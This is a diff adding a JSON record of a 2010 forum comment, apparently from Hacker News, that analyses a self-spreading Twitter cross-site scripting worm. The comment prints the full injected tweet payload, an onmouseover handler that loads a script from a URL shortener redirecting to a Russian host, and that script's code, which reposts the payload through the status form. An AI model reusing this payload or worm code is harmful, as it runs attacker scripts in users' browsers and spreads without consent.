@@ -1,0 +1,9 @@
+{
+  "by" : "avar",
+  "id" : 1712349,
+  "kids" : [ 1712909 ],
+  "parent" : 1712275,
+  "text" : "I got one with this content:<p><pre><code>    http://t.co/@\"style=\"font-size:999999999999px;\"onmouseover=\"$.getScript('http:\\u002f\\u002fis.gd\\u002ffl9A7')\"/\n</code></pre>\nWith the URL expanding to:<p><pre><code>    http://is.gd/fl9A7\n</code></pre>\nWhich is a 301 redirect to:<p><pre><code>    http://lexasoft.jino-net.ru/up1415.js\n</code></pre>\nWhich has the content:<p><pre><code>    $('#status').val(\"http://t.co/@\\\"style=\\\"font-size:999999999999px;\\\"onmouseover=\\\"$.getScript('http:\\\\u002f\\\\u002fis.gd\\\\u002ffl9A7')\\\"/\");\n    $('.status-update-form').submit();\n</code></pre>\nSo at least that one does nothing more than propagate itself, but it would be really easy to write one that's more harmful to users.",
+  "time" : 1285072341,
+  "type" : "comment"
+}
